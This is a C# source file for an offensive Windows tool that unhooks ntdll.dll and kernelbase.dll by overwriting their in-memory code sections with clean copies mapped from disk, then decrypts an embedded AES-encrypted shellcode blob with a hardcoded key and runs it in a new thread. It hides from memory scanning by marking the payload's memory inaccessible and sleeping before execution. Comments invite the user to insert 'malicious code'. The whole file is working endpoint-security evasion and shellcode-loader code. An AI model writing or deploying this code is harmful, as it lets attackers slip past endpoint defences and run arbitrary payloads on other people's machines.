using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Threading;

namespace UnhookDll
{
    class Program
    {
        static void Main(string[] args)
        {

            Debug("[+] Mapping Ntdll...");
            IntPtr pMapping = MapModule(@"c:\windows\system32\ntdll.dll");

            if (pMapping == IntPtr.Zero)
            {
                #if DEBUG
                Console.ReadLine();
                #endif
                return;
            }

            Debug("[+] Unhooking Ntdll...");
            if (!UnhookModule(GetModuleBaseAddress("ntdll.dll"), pMapping))
            {
                #if DEBUG
                Console.ReadLine();
                #endif
                return;
            }

            Debug("\n[+] Mapping Kernelbase...");
            pMapping = MapModule(@"c:\windows\system32\kernelbase.dll");

            if (pMapping == IntPtr.Zero)
            {
#if DEBUG
                Console.ReadLine();
#endif
                return;
            }

            Debug("[+] Unhooking Kernelbase...");
            if (!UnhookModule(GetModuleBaseAddress("kernelbase.dll"), pMapping))
            {
#if DEBUG
                Console.ReadLine();
#endif
                return;
            }

            // put your malicious code in here... or use the encrypted shellcode runner
            Shellcode();
            // ...

            // don't close main thread while shellcode is running
            while (true) { Thread.Sleep(1000); }
        }

        static void Shellcode()
        {
            Debug("\n[+] Shellcode runner...");
            
            // the encrypted payload and key - change this to your needs
            // see https://github.com/plackyhacker/ShellcodeEncryptor
            string payload = "4kRNv6IYTes83XyHrCb/7dnd+fRPCfQRof4miLBaIs3lpoqYLkkPsKGErvKXp1ohlnTJWyEFiO17HK2DzamT7SE+ELAVuJAUiExwwMHhkPIUBOQ/2pg8PkIaB3n/cEVp3E8S+xvz58bqFsbZ5SDQwIFw5hyBxgXy4HMxLCx39JplCGMKMVWmLX2I14+lS89Ep+/AyXFsm2jaggPkTxwOM/f+Fn+/IuYJ7mIguqaQ9ldgMnIrmGS2nIyyCfKTXKQrdFYDahu6YFw5D/WdJEWOD5x4xTf8aWDiIHQ6HRt79onHJSxclr+ud5aSdCyZvZbgpkzoHEjRbWtU+cBdycRAIUygQxAd/nVhJZUIK93Tizd07N3N006mFI9SCH6urbcQGKGpI916NbkhTidMxsc9I3QY0OikT/lmeHNqsZ+QaIz4RXvME5KRboTeb1ZmF5aj9xDISERCnymL4qots4uBYMO+RWP5weOhCXNPiOQ6JXcOASrUC3rUAM9qi4s0iyVdOBXZGfeItIClIXnsc1jGZQeJ9iFIHLmYIRLje4K+J3YKqOSNOBXxC4bhsb5sDe7b04vUPQ/wYQsrHMJpI/2m3wq9R4zp7+20bqYHSCTKJIeIySe4BzDgi+DtGtJDo/Jn5G+h05McYm6M1Dmw6tR9N+O8aAFr+bJsDqD124mwpeP6ApxePPsfIT6xYPaSqQLUR7VkiV8rOys3VvHEzixnMOqQsa9i9tHlqUe+THGTJARNcIwgKoesQlvLQp7WVjgSdnAuK5ougrBZzuRRE6rPiWiP3PfFJri/Cmp4wFWH+xfPxLcUBg6SmFdDRvWWj0OFSCMqMG6n3dsWycBYoWiDB6bqNqSNdKvUAPWDRCimM3tPqpl21als+ZedWaC00COznjOsQyO7rPiu+G/QMfMLI0pgOWodDUye+bp3l8X/qb6YymUWMclTethXMkWaGP77uhQ3tixeB6zIkzWSq8v+IPy10bTUH/MKr2BdE5SXShIQP+GRefIOQtu9f+Q1WVX+";
            string key = "vJpiA966V27EQiRFdZDsOuwsEMJVLTCX";

            Debug("[+] Decrypting payload...");
            // decrypt the payload
            byte[] buf = Decrypt(key, payload);

            Debug("[+] VirtualAlloc...");
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x00003000, (uint)AllocationProtectEnum.PAGE_READWRITE);

            IntPtr mahBuffer = Marshal.AllocHGlobal(buf.Length);
            Marshal.Copy(buf, 0, mahBuffer, buf.Length);

            Debug("[+] RtlMoveMemory...");
            RtlMoveMemory(addr, mahBuffer, payload.Length);

            Debug("[+] VirtualProtect (PAGE_NOACCESS)...");
            VirtualProtect(addr, (UIntPtr)buf.Length, (UInt32)AllocationProtectEnum.PAGE_NOACCESS, out uint lpflOldProtect);           
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0x00000004, IntPtr.Zero);

            Debug("[+] Sleeping...");
            Thread.Sleep(7000);

            Debug("[+] VirtualProtect (PAGE_EXECUTE_READ)...");
            VirtualProtect(addr, (UIntPtr)buf.Length, (UInt32)AllocationProtectEnum.PAGE_EXECUTE_READ, out lpflOldProtect);

            Debug("[+] ResumeThread...");
            ResumeThread(hThread);
        }

        private static byte[] Decrypt(string key, string aes_base64)
        {
            byte[] tempKey = Encoding.ASCII.GetBytes(key);
            tempKey = SHA256.Create().ComputeHash(tempKey);

            byte[] data = Convert.FromBase64String(aes_base64);

            // decrypt data
            Aes aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform dec = aes.CreateDecryptor(tempKey, SubArray(tempKey, 16));

            using (MemoryStream msDecrypt = new MemoryStream())
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
                {

                    csDecrypt.Write(data, 0, data.Length);

                    return msDecrypt.ToArray();
                }
            }
        }

        static byte[] SubArray(byte[] a, int length)
        {
            byte[] b = new byte[length];
            for (int i = 0; i < length; i++)
            {
                b[i] = a[i];
            }
            return b;
        }

        static IntPtr MapModule(string file)
        {
            IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

            string dllpath = file;
            // 0x80000000 = GENERIC_READ
            // 0x00000001 = FILE_SHARE_READ
            // 3 = OPEN_EXISTING

            // open the dll file
            IntPtr hFile = CreateFile(dllpath, 0x80000000, 0x00000001, IntPtr.Zero, 3, 0, IntPtr.Zero);

            if (hFile == INVALID_HANDLE_VALUE)
                return IntPtr.Zero;

            // create a memory map of the dll
            // 0x02 = PAGE_READONLY
            // 0x1000000 = SEC_IMAGE
            IntPtr hFileMapping = CreateFileMapping(hFile, IntPtr.Zero, 0x02 | 0x1000000, 0, 0, null);

            if (hFileMapping == IntPtr.Zero)
                return IntPtr.Zero;

            // get the memory address of the loaded dll file
            // 0x04 = FILE_MAP_READ
            IntPtr pMapping = MapViewOfFile(hFileMapping, 0x04, 0, 0, 0);

            // return the memory address
            return pMapping;
        }

        static bool UnhookModule(IntPtr originalDllAddress, IntPtr newDllMappingAddress)
        {
            Debug("[+] Original Dll address is 0x{0}", new string[] { originalDllAddress.ToString("X") });
            Debug("[+] Mapped Dll address is 0x{0}", new string[] { newDllMappingAddress.ToString("X") });

            // Marshall the pointer into an IMAGE_DOS_HEADER struct
            IMAGE_DOS_HEADER dosHdr = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(newDllMappingAddress, typeof(IMAGE_DOS_HEADER));

            if (dosHdr.isValid)
            {
                Debug("[+] Mapped Dll is a valid image.");
            }
            else
            {
                Debug("[!] Mapped Dll is NOT a valid image!");
                return false;
            }

            // get the address of the IMAGE_NT_HEADERS
            IntPtr pNtHeaders = newDllMappingAddress + dosHdr.e_lfanew;

            // Marshall the pointer into an IMAGE_NT_HEADERS64 struct
            IMAGE_NT_HEADERS64 ntHdrs = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(pNtHeaders, typeof(IMAGE_NT_HEADERS64));

            Debug("[+] e_lfanew equals 0x{0}", new string[] { dosHdr.e_lfanew.ToString("X") });
            Debug("[+] NT_HEADERS address is 0x{0}", new string[] { pNtHeaders.ToString("X") });

            if (ntHdrs.isValid)
            {
                Debug("[+] Mapped Dll NT Headers is valid.");
            }
            else
            {
                Debug("[!] Mapped Dll NT Headers is NOT valid!");
                return false;
            }

            Debug("[+] Sections to enumerate is {0}", new string[] { ntHdrs.FileHeader.NumberOfSections.ToString() });

            Int32 sizeOfNtHeader = (Marshal.SizeOf(ntHdrs.GetType()));

            IntPtr pCurrentSection = pNtHeaders + sizeOfNtHeader;
            IMAGE_SECTION_HEADER secHdr = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pCurrentSection, typeof(IMAGE_SECTION_HEADER));

            Debug("[+] First section is {0}", new string[] { secHdr.Section });
            Debug("[+] First section is at 0x{0}", new string[] { pCurrentSection.ToString("X") });

            // find the .text section of the newly loaded DLL
            for (int i = 0; i <  ntHdrs.FileHeader.NumberOfSections; i++)
            {
                Debug("[+] Analysing section {0}", new string[] { secHdr.Section });

                // find the code section
                if (secHdr.Section.StartsWith(".text"))
                {
                    // when we find the .text section break out of the loop
                    Debug("[+] .text section is at 0x{0}", new string[] { pCurrentSection.ToString("X") });
                    break;
                }

                // find the start of the next section
                Debug("[+] Section size is 0x{0}", new string[] { secHdr.SizeOfRawData.ToString("X") });
                Int32 sizeOfSection = (Marshal.SizeOf(secHdr.GetType()));

                pCurrentSection += sizeOfSection;
                Debug("[+] Next section is at 0x{0}", new string[] { pCurrentSection.ToString("X") });
                secHdr = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pCurrentSection, typeof(IMAGE_SECTION_HEADER));
            }

            // change the original dll page to writable
            Debug("[+] VirtualProtect Dll to PAGE_EXECUTE_READWRITE...");
            bool result = VirtualProtect(originalDllAddress, (UIntPtr)secHdr.VirtualSize, (UInt32)AllocationProtectEnum.PAGE_EXECUTE_READWRITE, out UInt32 lpflOldProtect);

            if(!result)
            {
                Debug("[!] Unable to change Dll page protection!");
                return false;
            }

            // copy the .text section of newly loaded DLL into original DLL
            Debug("[+] Unhooking Dll by copying mapped data...");
            try
            {
                byte[] buffer = new byte[(Int32)secHdr.VirtualSize];
                Marshal.Copy(newDllMappingAddress, buffer, 0, (Int32)secHdr.VirtualSize);
                Marshal.Copy(buffer, 0, originalDllAddress, (Int32)secHdr.VirtualSize);
            }
            catch(Exception ex)
            {
                Debug("[!] Unable to copy mapped data! {0}", new string[] { ex.Message });
                return false;
            }

            // restore the page settings for original DLL
            Debug("[+] VirtualProtect Dll to PAGE_EXECUTE_WRITECOPY...");
            result = VirtualProtect(originalDllAddress, (UIntPtr)secHdr.VirtualSize, (UInt32)AllocationProtectEnum.PAGE_EXECUTE_WRITECOPY, out lpflOldProtect);

            if (!result)
            {
                Debug("[!] Unable to change Dll page protection!");
                return false;
            }

            Debug("[+] Unmapping view of Dll...");
            UnmapViewOfFile(newDllMappingAddress);

            return true;
        }

        static IntPtr GetModuleBaseAddress(string name)
        {
            Process hProc = Process.GetCurrentProcess();

            foreach (ProcessModule m in hProc.Modules)
            {
                if (m.ModuleName.ToUpper().StartsWith(name.ToUpper()))
                    return m.BaseAddress;
            }

            // we can't find the base address
            return IntPtr.Zero;
        }

        public static void Debug(string text, string[] args)
        {
#if DEBUG
            Console.WriteLine(text, args);
#endif
        }

        public static void Debug(string text)
        {
#if DEBUG
            Console.WriteLine(text, new string[] { });
#endif
        }


        #region "Win32 Structs"

        public enum AllocationProtectEnum : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
            public char[] e_magic;       // Magic number
            public UInt16 e_cblp;    // Bytes on last page of file
            public UInt16 e_cp;      // Pages in file
            public UInt16 e_crlc;    // Relocations
            public UInt16 e_cparhdr;     // Size of header in paragraphs
            public UInt16 e_minalloc;    // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;    // Maximum extra paragraphs needed
            public UInt16 e_ss;      // Initial (relative) SS value
            public UInt16 e_sp;      // Initial SP value
            public UInt16 e_csum;    // Checksum
            public UInt16 e_ip;      // Initial IP value
            public UInt16 e_cs;      // Initial (relative) CS value
            public UInt16 e_lfarlc;     // File address of relocation table
            public UInt16 e_ovno;    // Overlay number
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res1;    // Reserved words
            public UInt16 e_oemid;       // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;     // OEM information; e_oemid specific
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2;    // Reserved words
            public Int32 e_lfanew;      // File address of new exe header

            private string _e_magic
            {
                get { return new string(e_magic); }
            }

            public bool isValid
            {
                get { return _e_magic == "MZ"; }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            [FieldOffset(0)]
            public ushort Magic;

            [FieldOffset(2)]
            public byte MajorLinkerVersion;

            [FieldOffset(3)]
            public byte MinorLinkerVersion;

            [FieldOffset(4)]
            public uint SizeOfCode;

            [FieldOffset(8)]
            public uint SizeOfInitializedData;

            [FieldOffset(12)]
            public uint SizeOfUninitializedData;

            [FieldOffset(16)]
            public uint AddressOfEntryPoint;

            [FieldOffset(20)]
            public uint BaseOfCode;

            [FieldOffset(24)]
            public ulong ImageBase;

            [FieldOffset(32)]
            public uint SectionAlignment;

            [FieldOffset(36)]
            public uint FileAlignment;

            [FieldOffset(40)]
            public ushort MajorOperatingSystemVersion;

            [FieldOffset(42)]
            public ushort MinorOperatingSystemVersion;

            [FieldOffset(44)]
            public ushort MajorImageVersion;

            [FieldOffset(46)]
            public ushort MinorImageVersion;

            [FieldOffset(48)]
            public ushort MajorSubsystemVersion;

            [FieldOffset(50)]
            public ushort MinorSubsystemVersion;

            [FieldOffset(52)]
            public uint Win32VersionValue;

            [FieldOffset(56)]
            public uint SizeOfImage;

            [FieldOffset(60)]
            public uint SizeOfHeaders;

            [FieldOffset(64)]
            public uint CheckSum;

            [FieldOffset(68)]
            public ushort Subsystem;

            [FieldOffset(70)]
            public ushort DllCharacteristics;

            [FieldOffset(72)]
            public ulong SizeOfStackReserve;

            [FieldOffset(80)]
            public ulong SizeOfStackCommit;

            [FieldOffset(88)]
            public ulong SizeOfHeapReserve;

            [FieldOffset(96)]
            public ulong SizeOfHeapCommit;

            [FieldOffset(104)]
            public uint LoaderFlags;

            [FieldOffset(108)]
            public uint NumberOfRvaAndSizes;

            [FieldOffset(112)]
            public IMAGE_DATA_DIRECTORY ExportTable;

            [FieldOffset(120)]
            public IMAGE_DATA_DIRECTORY ImportTable;

            [FieldOffset(128)]
            public IMAGE_DATA_DIRECTORY ResourceTable;

            [FieldOffset(136)]
            public IMAGE_DATA_DIRECTORY ExceptionTable;

            [FieldOffset(144)]
            public IMAGE_DATA_DIRECTORY CertificateTable;

            [FieldOffset(152)]
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;

            [FieldOffset(160)]
            public IMAGE_DATA_DIRECTORY Debug;

            [FieldOffset(168)]
            public IMAGE_DATA_DIRECTORY Architecture;

            [FieldOffset(176)]
            public IMAGE_DATA_DIRECTORY GlobalPtr;

            [FieldOffset(184)]
            public IMAGE_DATA_DIRECTORY TLSTable;

            [FieldOffset(192)]
            public IMAGE_DATA_DIRECTORY LoadConfigTable;

            [FieldOffset(200)]
            public IMAGE_DATA_DIRECTORY BoundImport;

            [FieldOffset(208)]
            public IMAGE_DATA_DIRECTORY IAT;

            [FieldOffset(216)]
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

            [FieldOffset(224)]
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

            [FieldOffset(232)]
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_NT_HEADERS64
        {
            [FieldOffset(0)]
            public UInt32 Signature;

            [FieldOffset(4)]
            public IMAGE_FILE_HEADER FileHeader;

            [FieldOffset(24)]
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;

            private string _Signature
            {
                get
                {
                    byte[] b = BitConverter.GetBytes(Signature);
                    return System.Text.Encoding.ASCII.GetString(b);
                }
            }

            public bool isValid
            {
                get { return _Signature == "PE\0\0" && OptionalHeader.Magic == 0x20b; }
            }
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;

            [FieldOffset(8)]
            public UInt32 VirtualSize;

            [FieldOffset(12)]
            public UInt32 VirtualAddress;

            [FieldOffset(16)]
            public UInt32 SizeOfRawData;

            [FieldOffset(20)]
            public UInt32 PointerToRawData;

            [FieldOffset(24)]
            public UInt32 PointerToRelocations;

            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;

            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;

            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;

            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }
        [Flags]
        public enum DataSectionFlags : uint
        {
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeReg = 0x00000000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeDsect = 0x00000001,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeNoLoad = 0x00000002,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeGroup = 0x00000004,
            /// <summary>
            /// The section should not be padded to the next boundary. This flag is obsolete and is replaced by IMAGE_SCN_ALIGN_1BYTES. This is valid only for object files.
            /// </summary>
            TypeNoPadded = 0x00000008,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeCopy = 0x00000010,
            /// <summary>
            /// The section contains executable code.
            /// </summary>
            ContentCode = 0x00000020,
            /// <summary>
            /// The section contains initialized data.
            /// </summary>
            ContentInitializedData = 0x00000040,
            /// <summary>
            /// The section contains uninitialized data.
            /// </summary>
            ContentUninitializedData = 0x00000080,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            LinkOther = 0x00000100,
            /// <summary>
            /// The section contains comments or other information. The .drectve section has this type. This is valid for object files only.
            /// </summary>
            LinkInfo = 0x00000200,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            TypeOver = 0x00000400,
            /// <summary>
            /// The section will not become part of the image. This is valid only for object files.
            /// </summary>
            LinkRemove = 0x00000800,
            /// <summary>
            /// The section contains COMDAT data. For more information, see section 5.5.6, COMDAT Sections (Object Only). This is valid only for object files.
            /// </summary>
            LinkComDat = 0x00001000,
            /// <summary>
            /// Reset speculative exceptions handling bits in the TLB entries for this section.
            /// </summary>
            NoDeferSpecExceptions = 0x00004000,
            /// <summary>
            /// The section contains data referenced through the global pointer (GP).
            /// </summary>
            RelativeGP = 0x00008000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            MemPurgeable = 0x00020000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            Memory16Bit = 0x00020000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            MemoryLocked = 0x00040000,
            /// <summary>
            /// Reserved for future use.
            /// </summary>
            MemoryPreload = 0x00080000,
            /// <summary>
            /// Align data on a 1-byte boundary. Valid only for object files.
            /// </summary>
            Align1Bytes = 0x00100000,
            /// <summary>
            /// Align data on a 2-byte boundary. Valid only for object files.
            /// </summary>
            Align2Bytes = 0x00200000,
            /// <summary>
            /// Align data on a 4-byte boundary. Valid only for object files.
            /// </summary>
            Align4Bytes = 0x00300000,
            /// <summary>
            /// Align data on an 8-byte boundary. Valid only for object files.
            /// </summary>
            Align8Bytes = 0x00400000,
            /// <summary>
            /// Align data on a 16-byte boundary. Valid only for object files.
            /// </summary>
            Align16Bytes = 0x00500000,
            /// <summary>
            /// Align data on a 32-byte boundary. Valid only for object files.
            /// </summary>
            Align32Bytes = 0x00600000,
            /// <summary>
            /// Align data on a 64-byte boundary. Valid only for object files.
            /// </summary>
            Align64Bytes = 0x00700000,
            /// <summary>
            /// Align data on a 128-byte boundary. Valid only for object files.
            /// </summary>
            Align128Bytes = 0x00800000,
            /// <summary>
            /// Align data on a 256-byte boundary. Valid only for object files.
            /// </summary>
            Align256Bytes = 0x00900000,
            /// <summary>
            /// Align data on a 512-byte boundary. Valid only for object files.
            /// </summary>
            Align512Bytes = 0x00A00000,
            /// <summary>
            /// Align data on a 1024-byte boundary. Valid only for object files.
            /// </summary>
            Align1024Bytes = 0x00B00000,
            /// <summary>
            /// Align data on a 2048-byte boundary. Valid only for object files.
            /// </summary>
            Align2048Bytes = 0x00C00000,
            /// <summary>
            /// Align data on a 4096-byte boundary. Valid only for object files.
            /// </summary>
            Align4096Bytes = 0x00D00000,
            /// <summary>
            /// Align data on an 8192-byte boundary. Valid only for object files.
            /// </summary>
            Align8192Bytes = 0x00E00000,
            /// <summary>
            /// The section contains extended relocations.
            /// </summary>
            LinkExtendedRelocationOverflow = 0x01000000,
            /// <summary>
            /// The section can be discarded as needed.
            /// </summary>
            MemoryDiscardable = 0x02000000,
            /// <summary>
            /// The section cannot be cached.
            /// </summary>
            MemoryNotCached = 0x04000000,
            /// <summary>
            /// The section is not pageable.
            /// </summary>
            MemoryNotPaged = 0x08000000,
            /// <summary>
            /// The section can be shared in memory.
            /// </summary>
            MemoryShared = 0x10000000,
            /// <summary>
            /// The section can be executed as code.
            /// </summary>
            MemoryExecute = 0x20000000,
            /// <summary>
            /// The section can be read.
            /// </summary>
            MemoryRead = 0x40000000,
            /// <summary>
            /// The section can be written to.
            /// </summary>
            MemoryWrite = 0x80000000
        }

        #endregion

        #region "Win32 Imports"

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateFile(String lpFileName, UInt32 dwDesiredAccess, UInt32 dwShareMode, IntPtr lpSecurityAttributes, UInt32 dwCreationDisposition, UInt32 dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, UInt32 flProtect, UInt32 dwMaximumSizeHigh, UInt32 dwMaximumSizeLow, [MarshalAs(UnmanagedType.LPStr)] string lpName);

        [DllImport("kernel32.dll")]
        static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, UInt32 dwDesiredAccess, UInt32 dwFileOffsetHigh, UInt32 dwFileOffsetLow, UInt32 dwNumberOfBytesToMap);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);


        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32", SetLastError = true, ExactSpelling = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        public static extern void RtlMoveMemory(IntPtr destData, IntPtr srcData, int size);


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("coredll.dll", EntryPoint = "GetModuleHandleW", SetLastError = true)]
        public static extern bool GetModuleHandleEx(uint flags, string moduleName, IntPtr hModule);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

        #endregion

    }
}
